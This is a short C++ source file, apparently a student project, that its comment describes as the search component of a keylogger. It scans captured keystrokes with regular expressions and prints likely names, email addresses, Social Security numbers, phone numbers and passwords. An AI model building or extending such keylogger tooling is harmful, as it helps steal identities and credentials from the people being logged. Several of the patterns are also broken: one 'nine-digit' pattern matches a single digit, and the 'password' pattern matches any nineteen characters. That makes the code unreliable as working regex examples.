/*
Created by Andres Orbe on 10/5/18.
The purpose of this code is to search the string for a series of information captured by the keylogger.
*/

#include <iostream>
#include <regex>
#include <cstring>
#include "regex.h"

using namespace std;


void match_occurrence(string data, regex reg){
    /*
     match_occurence looks for if there is an occurrence in the string and the desired option.
     */

    // cout << str;   // FLAG

    // This holds the first match
    sregex_iterator currentMatch(data.begin(), data.end(), reg);

    // Used to determine if there are any more matches
    sregex_iterator lastMatch;

    // While the current match doesn't equal the last
    while(currentMatch != lastMatch){
        smatch match = *currentMatch;
        cout << match.str() << endl;

        currentMatch++;
    }

}


void regex_search(string input) {
    /*
     * The boi that does all the 'heavy lifting' and has the algorithm that searches certain characters.
     */

    // reg2 looks for phone numbers in xxx-xxx-xxxx form
    regex reg1("\\w{3}-\\w{3}-\\w{4}");  // simple but also it captures all alphanumeric characters

    // searches for an email
    regex email("^[\\w!#$%&'*+\\-/=?\\^_`{|}~]+(\\.[\\w!#$%&'*+\\-/=?\\^_`{|}~]+)*@((([\\-\\w]+\\.)+[a-zA-Z]{2,4})|(([0-9]{1,3}\\.){3}s[0-9]{1,3}))$");
    regex email1("w{4,}@w{1,}.w{3}");

    // captures nine-digit numbers straight
    regex nine_digit("[0-9]");

    // specifically searches for xxx-xxx-xxxx and if each x is an integer
    regex phone_number_search("[0-9][0-9][0-9]-[0-9][0-9][0-9]-[0-9][0-9][0-9][0-9]");
    regex simple_number("\\d\\d\\d[0-9][0-9][0-9]\\d\\d[0-9]\\d");

    // potential ss numbers
    regex p_ssn("[0-9]\\d\\d[0-9]\\d\\d[0-9]\\d\\d");

    // Potential Name
    regex name_caps("[A-Z]\\w{1,20}\\s[A-Z]\\w{1,20}");
    regex name("\\w{2,20}\\s\\w{2,20}");

    // Potential password
    regex passwd("...................");

    cout << "Potential Name:" << endl;
    match_occurrence(input, name_caps); match_occurrence(input, name); cout << endl;

    cout << "Potential Matches for email: " << endl;
    match_occurrence(input, email); match_occurrence(input, email1);
    cout << endl;

    cout << "Potential Matches for Potential Social Security Numbers" << endl;
    match_occurrence(input, p_ssn); cout << endl;

    cout << "Potential Matches for Phone Number:" << endl;
    match_occurrence(input, phone_number_search); match_occurrence(input, simple_number); cout << endl;

    cout << "Potential Matches for Passwords:" << endl;
    match_occurrence(input, passwd); cout << endl;

}
